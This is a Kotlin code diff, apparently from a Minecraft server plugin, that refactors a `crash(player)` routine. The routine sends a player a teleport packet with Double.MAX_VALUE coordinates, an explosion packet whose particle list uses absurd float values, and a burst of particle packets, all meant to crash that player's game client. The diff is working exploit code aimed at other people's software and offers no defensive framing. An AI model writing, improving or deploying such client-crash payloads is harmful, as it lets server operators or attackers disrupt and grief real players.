@@ -33,6 +33,24 @@ class NMS_26 private constructor() : Version {
 
     private val vec3d = Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
 
+    private val positionMoveRotation by lazy {
+        PositionMoveRotation(
+            vec3d,
+            vec3d,
+            Float.MAX_VALUE,
+            Float.MAX_VALUE
+        )
+    }
+
+    private val weightedList by lazy {
+        weightedListOf(
+            ParticleTypes.ASH,
+            ParticleTypes.BUBBLE,
+            ParticleTypes.EXPLOSION,
+            ParticleTypes.FIREWORK
+        )
+    }
+
 
     override fun crash(player: Player) {
         val serverPlayer = (player as CraftPlayer).handle
@@ -50,12 +68,7 @@ class NMS_26 private constructor() : Version {
     ): List<Packet<ClientGamePacketListener>> = listOf(
         ClientboundTeleportEntityPacket(
             player.id,
-            PositionMoveRotation(
-                vec3d,
-                vec3d,
-                Float.MAX_VALUE,
-                Float.MAX_VALUE
-            ),
+            positionMoveRotation,
             emptySet(),
             true
         ),
@@ -66,18 +79,22 @@ class NMS_26 private constructor() : Version {
             Optional.of(vec3d),
             ParticleTypes.ASH,
             SoundEvents.GENERIC_EXPLODE,
-            WeightedList.of(
-                ExplosionParticleInfo(
-                    ParticleTypes.ASH,
-                    Float.MAX_VALUE,
-                    Float.MIN_VALUE
-                )
-            )
+            weightedList
         ),
         particlePacketOf(ParticleTypes.ASH, center),
         particlePacketOf(ParticleTypes.BUBBLE, center),
         particlePacketOf(ParticleTypes.CLOUD, center),
         particlePacketOf(ParticleTypes.ANGRY_VILLAGER, center)
+    )
+
+    private fun weightedListOf(vararg packets: ParticleOptions) = WeightedList.of(
+        *packets.map { particle ->
+            ExplosionParticleInfo(
+                particle,
+                1_000_000_000_000_000_000_000_000_000f,
+                Float.MIN_VALUE
+            )
+        }.toTypedArray()
     )
 
     private fun particlePacketOf(
